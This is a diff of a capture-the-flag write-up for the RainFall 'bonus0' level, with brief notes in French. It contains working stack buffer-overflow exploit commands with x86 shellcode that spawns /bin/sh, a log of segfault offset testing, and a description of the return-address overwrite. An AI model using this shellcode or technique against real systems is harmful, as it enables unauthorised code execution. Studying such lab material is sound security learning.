@@ -15,8 +15,7 @@ Here is our shellcode (size 24)
 ```
 
 ```bash
-(python -c 'print "A" * 20'; python -c 'print "B" * 19')  | ./bonus0
-```
+(python -c 'print "A" * 20'; python -c 'print "B" * 19')  | ./bonus0```
 
 ```bash
 (python -c 'print "A" * 20'; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x1c\xf7\xff\xbf"')  | ./bonus0
@@ -31,3 +30,21 @@ Here is our shellcode (size 24)
 ```bash
 (python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"'; python -c 'print "\x0b\xcd\x80" + "A" * 13 + "\x4e\xf7\xff\xbf"'; cat)  | ./bonus0
 ```
+LOG pour find segfault
+
+```bash
+bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 17')  | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBBB
+Segmentation fault (core dumped)
+bonus0@RainFall:~$ (python -c 'print "A" * 20'; python -c 'print "B" * 16')  | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBB BBBBBBBBBBBBBBBB
+```
+
+Payload
+20 chars de payload
++ 16 chars de payload
++ overwrite return addresse --> jump vers debut de buffer (start of payload)
